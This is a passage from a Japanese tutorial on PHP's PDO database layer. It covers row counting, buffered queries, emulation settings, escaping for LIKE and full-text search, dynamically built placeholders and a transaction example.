<li>件数だけでなく結果セットも一緒に欲しい場合， <a href="http://www.php.net/manual/ja/pdostatement.fetchall.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchAll</a> メソッドで一気に配列として取得し，それに対してPHPの <a href="http://www.php.net/manual/ja/function.count.php" rel="nofollow noopener" target="_blank">count</a> 関数を使う．</li>
<li>件数だけが欲しい場合は， <code>SELECT COUNT(*) WHERE ...</code> といったクエリを発行し，その結果を <a href="http://www.php.net/manual/ja/pdostatement.fetchcolumn.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchColumn</a> メソッドで得る．</li>
</ul>

<p>これらの方法が最も推奨されますが，他の方法が無いわけではありません．以下に補足説明を示します．但しこれらはMySQLやPostgreSQLについてのみ当てはまり，<ins>SQLiteには当てはまりません</ins>．</p>

<h3>
<span id="バッファクエリ使用時" class="fragment"></span><a href="#%E3%83%90%E3%83%83%E3%83%95%E3%82%A1%E3%82%AF%E3%82%A8%E3%83%AA%E4%BD%BF%E7%94%A8%E6%99%82"><i class="fa fa-link"></i></a>バッファクエリ使用時</h3>

<ul>
<li>
<strong>SELECT</strong> に対しても常に <a href="http://www.php.net/manual/ja/pdostatement.rowcount.php" rel="nofollow noopener" target="_blank">PDOStatement::rowCount</a> メソッドを使うことができる．</li>
</ul>

<h3>
<span id="非バッファクエリ使用時" class="fragment"></span><a href="#%E9%9D%9E%E3%83%90%E3%83%83%E3%83%95%E3%82%A1%E3%82%AF%E3%82%A8%E3%83%AA%E4%BD%BF%E7%94%A8%E6%99%82"><i class="fa fa-link"></i></a>非バッファクエリ使用時</h3>

<ul>
<li>
<a href="http://www.php.net/manual/ja/pdostatement.fetchall.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchAll</a> メソッドを実行した後，つまり<ins>全てのフェッチが終わった後</ins>であれば <strong>SELECT</strong> に対しても <a href="http://www.php.net/manual/ja/pdostatement.rowcount.php" rel="nofollow noopener" target="_blank">PDOStatement::rowCount</a> メソッドを使うことができる．</li>
<li>結果のフェッチを途中で中断したまま次のクエリ実行に移行するときは， <a href="http://www.php.net/manual/ja/pdostatement.closecursor.php" rel="nofollow noopener" target="_blank">PDOStatement::closeCursor</a> メソッドを使ってカーソルを閉じる必要がある．1つ目の結果セットをPDOStatementに保持したまま2つ目のSQLを実行することはできないので，その場合はあらかじめ <a href="http://www.php.net/manual/ja/pdostatement.fetchall.php" rel="nofollow noopener" target="_blank">PDOStatement::fetchAll</a> メソッドでデータを退避させておく必要がある．</li>
</ul>

<h2>
<span id="データベース接続の切断" class="fragment"></span><a href="#%E3%83%87%E3%83%BC%E3%82%BF%E3%83%99%E3%83%BC%E3%82%B9%E6%8E%A5%E7%B6%9A%E3%81%AE%E5%88%87%E6%96%AD"><i class="fa fa-link"></i></a>データベース接続の切断</h2>

<p>データベース処理の最後に</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$pdo</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</pre></div></div>

<p>と書いているコードが散見されますが，ほとんどの場合ではこの記述は不要です．必要になるのは，非バッファクエリを使うようなバッチ処理のシーンのみです．</p>

<h1>
<span id="エミュレーションに関するまとめ" class="fragment"></span><a href="#%E3%82%A8%E3%83%9F%E3%83%A5%E3%83%AC%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AB%E9%96%A2%E3%81%99%E3%82%8B%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>エミュレーションに関するまとめ</h1>

<p>これまでに何度か登場した，エミュレーションの有無に関する差異を表にまとめます．</p>

<table>
<thead>
<tr>
<th style="text-align: left">項目</th>
<th style="text-align: center">エミュレーションON</th>
<th style="text-align: center">エミュレーションOFF</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left">パフォーマンス</td>
<td style="text-align: center">○</td>
<td style="text-align: center">△</td>
</tr>
<tr>
<td style="text-align: left">
<code>SET NAMES</code> による安全性</td>
<td style="text-align: center">△</td>
<td style="text-align: center">○</td>
</tr>
<tr>
<td style="text-align: left">NULL値をそのままの型で受け取る</td>
<td style="text-align: center">○</td>
<td style="text-align: center">○</td>
</tr>
<tr>
<td style="text-align: left">
<strong>数値をそのままの型で受け取る</strong><br>( <strong>mysqlnd</strong> のみが対象)</td>
<td style="text-align: center">×</td>
<td style="text-align: center">○</td>
</tr>
<tr>
<td style="text-align: left"><strong>複数の同名プレースホルダ</strong></td>
<td style="text-align: center">○</td>
<td style="text-align: center">×</td>
</tr>
<tr>
<td style="text-align: left"><strong><code>PDO::PARAM_*</code> 定数による正しいキャスト</strong></td>
<td style="text-align: center">×</td>
<td style="text-align: center">○</td>
</tr>
<tr>
<td style="text-align: left">
<strong><a href="http://www.php.net/manual/ja/pdostatement.bindparam.php" rel="nofollow noopener" target="_blank">PDOStatement::bindParam</a></strong> メソッドによる副作用問題</td>
<td style="text-align: center">×</td>
<td style="text-align: center">○</td>
</tr>
<tr>
<td style="text-align: left"><strong>複文の実行</strong></td>
<td style="text-align: center">○</td>
<td style="text-align: center">✕</td>
</tr>
</tbody>
</table>

<h1>
<span id="pdoの応用" class="fragment"></span><a href="#pdo%E3%81%AE%E5%BF%9C%E7%94%A8"><i class="fa fa-link"></i></a>PDOの応用</h1>

<h2>
<span id="pdostatementのデータ取得形式を極める" class="fragment"></span><a href="#pdostatement%E3%81%AE%E3%83%87%E3%83%BC%E3%82%BF%E5%8F%96%E5%BE%97%E5%BD%A2%E5%BC%8F%E3%82%92%E6%A5%B5%E3%82%81%E3%82%8B"><i class="fa fa-link"></i></a>PDOStatementのデータ取得形式を極める</h2>

<ul>
<li><a href="http://qiita.com/mpyw/items/d52351bd1a8068344cc2" id="reference-0e9b0d741f515319f71e">Qiita - PDOフェッチパターン大全</a></li>
</ul>

<h2>
<span id="mysqlの暗黙的な型変換を防止する" class="fragment"></span><a href="#mysql%E3%81%AE%E6%9A%97%E9%BB%99%E7%9A%84%E3%81%AA%E5%9E%8B%E5%A4%89%E6%8F%9B%E3%82%92%E9%98%B2%E6%AD%A2%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>MySQLの暗黙的な型変換を防止する</h2>

<p>既に述べたとおり，MySQLは暗黙的な型変換を行います．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">もしageが整数型でも，MySQLはエラーを発生しない</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE age = ?'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">([</span><span class="s1">'20'</span><span class="p">]);</span>
</pre></div>
</div>

<p>もしPostgreSQLのように厳密さを与えたいならば，あらかじめ以下のクエリを実行しておきます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">exec</span><span class="p">(</span><span class="s2">"SET SESSION sql_mode='TRADITIONAL'"</span><span class="p">);</span>
</pre></div></div>

<ul>
<li><a href="http://qiita.com/yukix/items/c9ad1e38bb98b7c924f3" id="reference-7250ad69a201e99bea7f">Qiita - MySQLの自動変換が厄介な時の設定</a></li>
</ul>

<h2>
<span id="like検索" class="fragment"></span><a href="#like%E6%A4%9C%E7%B4%A2"><i class="fa fa-link"></i></a>LIKE検索</h2>

<p>部分一致のあいまいな検索を行いたい場合，LIKE演算子を使用します．LIKE検索で使われる特殊文字には</p>

<ul>
<li>
<code>%</code> … 任意の0文字以上の文字列</li>
<li>
<code>_</code> … 任意の1文字</li>
</ul>

<p>があるため，これらの文字を普通に検索したい場合にはエスケープが必要となります．MySQLの場合はエスケープ用の文字を省略して <code>\</code> にすることが出来ますが，SQLiteなど他のデータベースとの互換性を考慮する場合，エスケープに使用する文字を明示すべきです．例えば <code>!</code> を用いる場合は <code>ESCAPE '!'</code> とします．なお，エスケープ用の文字が文字列中に含まれているケースにも対応するために，そのエスケープ用の文字自体のエスケープも必要です．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">どんなデータベースにも広く使える方法</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s2">"SELECT * FROM users WHERE name LIKE ? ESCAPE '!'"</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">'%'</span> <span class="o">.</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/(?=[!_%])/'</span><span class="p">,</span> <span class="s1">'!'</span><span class="p">,</span> <span class="nv">$name</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'%'</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
</pre></div>
</div>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MySQL専用の方法</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE name LIKE ?'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">'%'</span> <span class="o">.</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">'\_%'</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'%'</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
</pre></div>
</div>

<h2>
<span id="ブール全文検索" class="fragment"></span><a href="#%E3%83%96%E3%83%BC%E3%83%AB%E5%85%A8%E6%96%87%E6%A4%9C%E7%B4%A2"><i class="fa fa-link"></i></a>ブール全文検索</h2>

<p>MySQLでブール全文検索を行いたい場合，IN BOOLEAN MODE修飾子を使用します．全文検索関数で使われる特殊文字には</p>

<ul>
<li>
<code>+</code> … 各行に存在しなければならない</li>
<li>
<code>-</code> … 各行に存在してはならない</li>
<li>
<code>@</code> … 距離</li>
<li>
<code>&lt;</code>, <code>&gt;</code> … 単語の貢献度</li>
<li>
<code>(</code>, <code>)</code> … グループ化</li>
<li>
<code>~</code> … 否定演算子</li>
<li>
<code>*</code> … 切り捨てまたはワイルドカード</li>
<li>
<code>"</code> … フレーズ検索</li>
</ul>

<p>があるため，これらの文字を普通に検索したい場合にはエスケープが必要となります．</p>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">MySQL専用の方法</span></div>
<div class="highlight"><pre><span></span><span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'SELECT * FROM users WHERE MATCH (description) AGAINST (? IN BOOLEAN MODE)'</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="nb">addcslashes</span><span class="p">(</span><span class="nv">$name</span><span class="p">,</span> <span class="s1">'\+-@&lt;&gt;()~*"'</span><span class="p">),</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_STR</span><span class="p">);</span>
</pre></div>
</div>

<h2>
<span id="可変長プレースホルダ" class="fragment"></span><a href="#%E5%8F%AF%E5%A4%89%E9%95%B7%E3%83%97%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%9B%E3%83%AB%E3%83%80"><i class="fa fa-link"></i></a>可変長プレースホルダ</h2>

<h3>
<span id="固定長プレースホルダではどうなるか" class="fragment"></span><a href="#%E5%9B%BA%E5%AE%9A%E9%95%B7%E3%83%97%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%9B%E3%83%AB%E3%83%80%E3%81%A7%E3%81%AF%E3%81%A9%E3%81%86%E3%81%AA%E3%82%8B%E3%81%8B"><i class="fa fa-link"></i></a>固定長プレースホルダではどうなるか</h3>

<p>例えば，検索キーワードを複数受け取って特定のカラムがそれらすべてに部分一致するかどうかの検索を行う場合を考えましょう．キーワードの数が2個の場合，実行の流れは次のようになります．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$keywords</span> <span class="o">=</span> <span class="p">[</span><span class="s1">'foo'</span><span class="p">,</span> <span class="s1">'bar'</span><span class="p">];</span>
<span class="k">foreach</span> <span class="p">(</span><span class="nv">$keywords</span> <span class="k">as</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// LIKE検索のために「%キーワード%」の形式にする</span>
    <span class="nv">$values</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'%'</span> <span class="o">.</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/(?=[!_%])/'</span><span class="p">,</span> <span class="s1">'!'</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'%'</span><span class="p">;</span>
<span class="p">}</span>
<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT * FROM books WHERE ((summary LIKE ? ESCAPE '!') AND (summary LIKE ? ESCAPE '!'))"</span><span class="p">;</span>
<span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
<span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="nv">$values</span><span class="p">);</span>
</pre></div></div>

<h3>
<span id="可変長プレースホルダの導入" class="fragment"></span><a href="#%E5%8F%AF%E5%A4%89%E9%95%B7%E3%83%97%E3%83%AC%E3%83%BC%E3%82%B9%E3%83%9B%E3%83%AB%E3%83%80%E3%81%AE%E5%B0%8E%E5%85%A5"><i class="fa fa-link"></i></a>可変長プレースホルダの導入</h3>

<p>ところが，実際は検索キーワードの数が不定個数となるのが一般的です．このような場合にはどうすればいいか？そこで必要になってくるのが，動的にプレースホルダを生成することです．具体例を下に示します．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nv">$keywords</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* キーワードが1つ以上のときだけ実行 */</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$keywords</span> <span class="k">as</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// プレースホルダのLIKE部分を用意</span>
        <span class="nv">$holders</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"(summary LIKE ? ESCAPE '!')"</span><span class="p">;</span>
        <span class="c1">// LIKE検索のために「%キーワード%」の形式にする</span>
        <span class="nv">$values</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'%'</span> <span class="o">.</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/(?=[!_%])/'</span><span class="p">,</span> <span class="s1">'!'</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'%'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// AND条件で結合する</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'SELECT * FROM books WHERE ('</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">' AND '</span><span class="p">,</span> <span class="nv">$holders</span><span class="p">)</span> <span class="o">.</span> <span class="s1">')'</span><span class="p">;</span>
    <span class="c1">// 実行</span>
    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="nv">$values</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<p>検索対象のカラムが2つあり， <em>summary1</em> と <em>summary2</em> の<ins>どちらかに</ins>一致すればOKと見なす場合は次のようにします．OR条件とAND条件を両方用いていることに注意してください．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="k">if</span> <span class="p">(</span><span class="nv">$keywords</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* キーワードが1つ以上のときだけ実行 */</span>
    <span class="k">foreach</span> <span class="p">(</span><span class="nv">$keywords</span> <span class="k">as</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// プレースホルダのLIKE部分を用意</span>
        <span class="nv">$holders</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">"((summary1 LIKE ? ESCAPE '!') OR (summary2 LIKE ? ESCAPE '!'))"</span><span class="p">;</span>
        <span class="c1">// LIKE検索のために「%キーワード%」の形式にする</span>
        <span class="nv">$values</span><span class="p">[]</span> <span class="o">=</span> <span class="nv">$values</span><span class="p">[]</span> <span class="o">=</span> <span class="s1">'%'</span> <span class="o">.</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'/(?=[!_%])/'</span><span class="p">,</span> <span class="s1">'!'</span><span class="p">,</span> <span class="nv">$keyword</span><span class="p">)</span> <span class="o">.</span> <span class="s1">'%'</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="c1">// AND条件で結合する</span>
    <span class="nv">$sql</span> <span class="o">=</span> <span class="s1">'SELECT * FROM books WHERE ('</span> <span class="o">.</span> <span class="nb">implode</span><span class="p">(</span><span class="s1">' AND '</span><span class="p">,</span> <span class="nv">$holders</span><span class="p">)</span> <span class="o">.</span> <span class="s1">')'</span><span class="p">;</span>
    <span class="c1">// 実行</span>
    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
    <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">(</span><span class="nv">$values</span><span class="p">);</span>
<span class="p">}</span>
</pre></div></div>

<h3>
<span id="検索キーワードを単語単位に分解する" class="fragment"></span><a href="#%E6%A4%9C%E7%B4%A2%E3%82%AD%E3%83%BC%E3%83%AF%E3%83%BC%E3%83%89%E3%82%92%E5%8D%98%E8%AA%9E%E5%8D%98%E4%BD%8D%E3%81%AB%E5%88%86%E8%A7%A3%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>検索キーワードを単語単位に分解する</h3>

<p>実際に検索システムを実装するときに，どのようにして検索キーワードを <code>$keywords</code> に配列でセットするかどうかが問題となりますが，これは半角スペースで分割させることが一般的であると考えられます．しかし，ここでは半角スペースだけでなく…</p>

<ul>
<li><strong>全てのASCII制御文字</strong></li>
<li>全角スペース</li>
<li>ハードスペース(&amp;nbsp;)</li>
</ul>

<p>正規表現を活用して，これらすべてを対象にしてみます．</p>

<div class="code-frame" data-lang="php"><div class="highlight"><pre><span></span><span class="nv">$q</span> <span class="o">=</span> <span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">filter_input</span><span class="p">(</span><span class="nx">INPUT_GET</span><span class="p">,</span> <span class="s1">'q'</span><span class="p">);</span>
<span class="nv">$regex</span> <span class="o">=</span> <span class="s2">"/[</span><span class="se">\\</span><span class="s2">x0-</span><span class="se">\x20\x7f\xc2\xa0\xe3\x80\x80</span><span class="s2">]++/u"</span><span class="p">;</span>
<span class="nv">$keywords</span> <span class="o">=</span> <span class="nb">preg_split</span><span class="p">(</span><span class="nv">$regex</span><span class="p">,</span> <span class="nv">$q</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="nx">PREG_SPLIT_NO_EMPTY</span><span class="p">);</span>
</pre></div></div>

<p><strong><code>PREG_SPLIT_NO_EMPTY</code></strong> フラグを用いることで，空文字列の要素を自動的に除外できるのも <a href="http://www.php.net/manual/ja/function.preg-split.php" rel="nofollow noopener" target="_blank">preg_split</a> 関数の強みです．</p>

<h2>
<span id="トランザクション処理" class="fragment"></span><a href="#%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B6%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E5%87%A6%E7%90%86"><i class="fa fa-link"></i></a>トランザクション処理</h2>

<p>連続的なSQL実行に一貫性・信頼性を持たせたい場合，「トランザクション」という機能を利用します．</p>

<ul>
<li><a href="http://ja.wikipedia.org/wiki/%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B6%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E5%87%A6%E7%90%86" rel="nofollow noopener" target="_blank">Wikipedia - トランザクション処理</a></li>
</ul>

<h3>
<span id="トランザクションの基本的な利用法" class="fragment"></span><a href="#%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B6%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E5%9F%BA%E6%9C%AC%E7%9A%84%E3%81%AA%E5%88%A9%E7%94%A8%E6%B3%95"><i class="fa fa-link"></i></a>トランザクションの基本的な利用法</h3>

<h4>
<span id="使用されるメソッド" class="fragment"></span><a href="#%E4%BD%BF%E7%94%A8%E3%81%95%E3%82%8C%E3%82%8B%E3%83%A1%E3%82%BD%E3%83%83%E3%83%89"><i class="fa fa-link"></i></a>使用されるメソッド</h4>

<p>処理の実体はデータベースごとに固有の実装が為されていますが，インタフェースはPDOのメソッドとして抽象化されており，SQL文をデータベースごとに書き分けたりする必要はなくなります．</p>

<ul>
<li><a href="http://www.php.net/manual/ja/pdo.begintransaction.php" rel="nofollow noopener" target="_blank">PDO::beginTransaction</a></li>
<li><a href="http://www.php.net/manual/ja/pdo.commit.php" rel="nofollow noopener" target="_blank">PDO::commit</a></li>
<li><a href="http://www.php.net/manual/ja/pdo.rollback.php" rel="nofollow noopener" target="_blank">PDO::rollBack</a></li>
<li>
<a href="http://www.php.net/manual/ja/pdo.lastinsertid.php" rel="nofollow noopener" target="_blank">PDO::lastInsertId</a> (必要に応じて)</li>
</ul>

<h4>
<span id="ポイント" class="fragment"></span><a href="#%E3%83%9D%E3%82%A4%E3%83%B3%E3%83%88"><i class="fa fa-link"></i></a>ポイント</h4>

<ul>
<li>Tryブロックを <strong>2重</strong> に設け，例外発生時にはロールバックを実行し，捕捉した例外を必要に応じて<ins>外側のTryブロックに向けてスロー</ins>する．</li>
<li>同じ形式のプリペアドステートメントの生成は1回だけにして，それを使いまわすようにした方がパフォーマンスは向上する．</li>
</ul>

<div class="code-frame" data-lang="php">
<div class="code-lang"><span class="bold">例</span></div>
<div class="highlight"><pre><span></span><span class="k">try</span> <span class="p">{</span>

    <span class="c1">// データベースに接続</span>
    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span>
        <span class="s1">'mysql:dbname=testdb;host=localhost;charset=utf8mb4'</span><span class="p">,</span>
        <span class="s1">'root'</span><span class="p">,</span>
        <span class="s1">''</span><span class="p">,</span>
        <span class="p">[</span>
            <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_ERRMODE</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">ERRMODE_EXCEPTION</span><span class="p">,</span>
            <span class="nx">PDO</span><span class="o">::</span><span class="na">ATTR_DEFAULT_FETCH_MODE</span> <span class="o">=&gt;</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">FETCH_ASSOC</span><span class="p">,</span>
        <span class="p">]</span>
    <span class="p">);</span>

    <span class="c1">// パラメータ</span>
    <span class="nv">$from</span> <span class="o">=</span> <span class="s1">'A'</span><span class="p">;</span>
    <span class="nv">$to</span> <span class="o">=</span> <span class="s1">'B'</span><span class="p">;</span>
    <span class="nv">$transfer_amount</span> <span class="o">=</span> <span class="mi">12000</span><span class="p">;</span>

    <span class="c1">// プリペアドステートメントを用意</span>
    <span class="nv">$stmt</span> <span class="o">=</span> <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">prepare</span><span class="p">(</span><span class="s1">'UPDATE account SET credit = credit + (?) WHERE id = ?'</span><span class="p">);</span>

    <span class="c1">// トランザクション処理を開始</span>
    <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">beginTransaction</span><span class="p">();</span>
    <span class="k">try</span> <span class="p">{</span>
        <span class="c1">// Aの預金残高を減らす</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span> <span class="o">*</span> <span class="nv">$transfer_amount</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nv">$from</span><span class="p">);</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
        <span class="c1">// Bの預金残高を増やす</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="o">+</span><span class="mi">1</span> <span class="o">*</span> <span class="nv">$transfer_amount</span><span class="p">,</span> <span class="nx">PDO</span><span class="o">::</span><span class="na">PARAM_INT</span><span class="p">);</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">bindValue</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="nv">$to</span><span class="p">);</span>
        <span class="nv">$stmt</span><span class="o">-&gt;</span><span class="na">execute</span><span class="p">();</span>
        <span class="c1">// コミット</span>
        <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">commit</span><span class="p">();</span>
    <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">// ロールバック</span>
        <span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">rollBack</span><span class="p">();</span>
        <span class="c1">// 外側のTryブロックに対してスロー</span>
        <span class="k">throw</span> <span class="nv">$e</span><span class="p">;</span>
    <span class="p">}</span>

<span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">PDOException</span> <span class="nv">$e</span><span class="p">)</span> <span class="p">{</span>

    <span class="c1">// 例外メッセージを表示</span>
    <span class="nb">header</span><span class="p">(</span><span class="s1">'Content-Type: text/plain; charset=UTF-8'</span><span class="p">,</span> <span class="k">true</span><span class="p">,</span> <span class="mi">500</span><span class="p">);</span>
    <span class="k">exit</span><span class="p">(</span><span class="nv">$e</span><span class="o">-&gt;</span><span class="na">getMessage</span><span class="p">());</span>

<span class="p">}</span>
</pre></div>
</div>

<h3>
<span id="トランザクションの種類" class="fragment"></span><a href="#%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B6%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E3%81%AE%E7%A8%AE%E9%A1%9E"><i class="fa fa-link"></i></a>トランザクションの種類</h3>

<p>秀逸な記事は太字にして紹介します．</p>

<ul>
<li><strong><a href="http://tree-tips.appspot.com/mysql/transaction_isoration/" rel="nofollow noopener" target="_blank">tree-tips - MySQLのトランザクション分離レベル</a></strong></li>
<li><strong><a href="http://www.techscore.com/tech/sql/SQL11/11_03.html" rel="nofollow noopener" target="_blank">TECHSCORE - トランザクションの定義</a></strong></li>
<li><strong><a href="http://d.hatena.ne.jp/language_and_engineering/20110104/p1" rel="nofollow noopener" target="_blank">主に言語とシステム開発に関して - DBの「トランザクション分離レベル」が必要な理由</a></strong></li>
<li><a href="http://ja.wikipedia.org/wiki/%E3%83%88%E3%83%A9%E3%83%B3%E3%82%B6%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3%E5%88%86%E9%9B%A2%E3%83%AC%E3%83%99%E3%83%AB" rel="nofollow noopener" target="_blank">Wikipedia - トランザクション分離レベル</a></li>
<li><a href="http://momijiame.tumblr.com/post/41512778756/mysql" rel="nofollow noopener" target="_blank">CUBE SUGAR STORAGE - MySQL を使ってトランザクション分離レベルの違いを試す</a></li>
<li><a href="http://d.hatena.ne.jp/sekom/20081115/p1" rel="nofollow noopener" target="_blank">ソフト開発お仕事メモ - [DB]H2, Derby, SQLiteの仕様の調査メモ（ロック周り）</a></li>
</ul>

<h4>
<span id="推奨場面まとめ" class="fragment"></span><a href="#%E6%8E%A8%E5%A5%A8%E5%A0%B4%E9%9D%A2%E3%81%BE%E3%81%A8%E3%82%81"><i class="fa fa-link"></i></a>推奨場面まとめ</h4>

<p><a href="https://camo.qiitausercontent.com/57a7f0b834ed2d360796815b7af2838172b8bf98/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f66663364616463322d323831392d323335662d656232612d3866313262613562393430352e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/57a7f0b834ed2d360796815b7af2838172b8bf98/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f32353036302f66663364616463322d323831392d323335662d656232612d3866313262613562393430352e706e67" alt="ss (2014-03-26 at 01.47.23).png" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/25060/ff3dadc2-2819-235f-eb2a-8f12ba5b9405.png"></a></p>

<h4>
